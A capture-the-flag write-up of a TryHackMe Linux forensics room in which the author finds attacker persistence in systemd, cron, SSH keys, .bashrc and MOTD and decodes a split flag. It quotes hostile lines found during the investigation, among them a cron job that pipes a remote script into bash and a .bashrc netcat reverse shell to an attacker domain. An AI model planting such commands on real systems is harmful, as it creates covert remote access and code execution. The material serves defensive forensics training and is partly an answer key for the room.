---
title: Hide and Seek
summary: TryHackMe Linux live-system forensics room uncovering multiple post-compromise persistence mechanisms and reconstructing a split flag from encoded artefacts.
date: 2026-07-01
tags: [TryHackMe, Linux Forensics, Persistence, Cron, SSH, Systemd, Bashrc, MOTD]
difficulty: easy
os: Linux
url: https://tryhackme.com/room/hfb1hideandseek
---

# CTF Room: Hide and Seek
- [Link to room](https://tryhackme.com/room/hfb1hideandseek)
- **Difficulty:** Easy
- **Category:** Linux Forensics, Persistence, Live System Analysis
- **OS:** Linux

## 1. Brief
Hide and Seek is a TryHackMe live-system forensics room focused on finding persistence mechanisms left behind by an attacker called Cipher.

The attacker's note gave five clues:

- `Time is on my side, always running like clockwork.`
- `A secret handshake gets me in every time.`
- `Whenever you set the stage, I make my entrance.`
- `I run with the big dogs, booting up alongside the system.`
- `I love welcome messages.`

Each persistence mechanism contained an encoded part of the final flag.

## 2. Initial Checks
I started with shell history files.

### Commands
```bash
cat ~/.bash_history 2>/dev/null
cat ~/.viminfo 2>/dev/null
```

The `.bash_history` file did not immediately reveal much, but `.viminfo` showed evidence that cron-related files had been edited. That made scheduled tasks and common persistence locations the next targets.

## 3. Systemd Persistence

#### Clue: I run with the big dogs, booting up alongside the system.
I checked common cron directories first, but nothing stood out there.

### Commands
```bash
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
```

The clue pointed toward something that boots with the system, so I checked systemd unit files.

### Commands
```bash
ls -la /lib/systemd/system/
sudo cat /lib/systemd/system/cipher.service
```

The suspicious unit was:

```text
cipher.service
```

Inside it was an encoded domain-style value.

### Encoded Artefact
```text
NHRoIHBhcnQgLSBoMW5nXyAK.s1mpl3bd.com
```

The first label was Base64 encoded.

### Decoded
```text
4th part - h1ng_
```

## 4. Cron Persistence

#### Clue: Time is on my side, always running like clockwork.
This clue pointed at cron. The suspicious entry executed a Base64-decoded command every minute.

### Cron Entry
```bash
* * * * * /bin/bash -c 'echo Y3VybCAtcyA1NDQ4NGQ3Yjc5MzAuc3RvcmFnM19jMXBoM3JzcXU0ZC5uZXQvYS5zaCB8IGJhc2gK | base64 -d | bash 2>/dev/null'
```

Decoding the Base64 produced a curl pipeline.

### Decoded Command
```bash
curl -s 54484d7b7930.storag3_c1ph3rsqu4d.net/a.sh | bash
```

The subdomain `54484d7b7930` was hex encoded.

### Decoded
```text
||******||
```

This was the first part of the flag.

## 5. SSH Persistence

#### Clue: A secret handshake gets me in every time.
This clue sounded like SSH key persistence, so I checked hidden SSH authorization files.

### Command
```bash
sudo cat /home/zeroday/.ssh/.authorized_keys 2>/dev/null
```

### Evidence
```text
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGigCKLtSqMcOfttFdDnNXfwKd5nH8Ws3hFNRmBDWxfvuaaC6h9zWishJVfr0xsyV0SSkMGPCuPLRU41ckvnGbA= 326e6420706172743a20755f6730745f.local
```

The key comment contained an encoded hostname. The useful part was the hex string before `.local`.

### Encoded Artefact
```text
326e6420706172743a20755f6730745f
```

### Decoded
```text
2nd part: u_g0t_
```

## 6. Shell Startup Persistence

#### Clue: Whenever you set the stage, I make my entrance.
This clue pointed toward shell startup files such as `.bashrc`.

### Command
```bash
sudo cat /home/specter/.bashrc 2>/dev/null
```

### Suspicious Entry
```bash
nc -e /bin/bash 4d334a6b58334130636e513649444e324d334a3564416f3d.cipher.io 443 2>/dev/null
```

The subdomain was hex encoded.

### Hex Decoded
```text
M3JkX3A0cnQ6IDN2M3J5dAo=
```

That decoded value was Base64.

### Base64 Decoded
```text
3rd_p4rt: 3v3ryt
```

## 7. MOTD Persistence

#### Clue: I love welcome messages.
Welcome messages on Linux are commonly handled through MOTD scripts, so I checked `/etc/update-motd.d/`.

### Command
```bash
cat /etc/update-motd.d/00-header
```

### Encoded Artefact
```text
4c61737420706172743a206430776e7d0.h1dd3nd00r.n3t
```

The useful even-length hex portion of the first label was hex encoded:

```text
4c61737420706172743a206430776e7d
```

### Decoded
```text
Last part: d0wn}
```

## 8. Flag

#### What is the flag?
Combining the decoded fragments gave the final flag:

```text
||******|| + ||******|| + ||******|| + ||*****|| + ||*****||
```

### Answer
```text
||THM{y0u_g0t_3v**************||
```

## 9. Summary
The attacker left multiple persistence mechanisms across the system:

- Cron for timed execution
- SSH authorized keys for access persistence
- `.bashrc` for shell startup execution
- A systemd service for boot persistence
- MOTD scripting for welcome-message execution

Each artefact contained an encoded flag fragment, and combining them revealed the final answer.
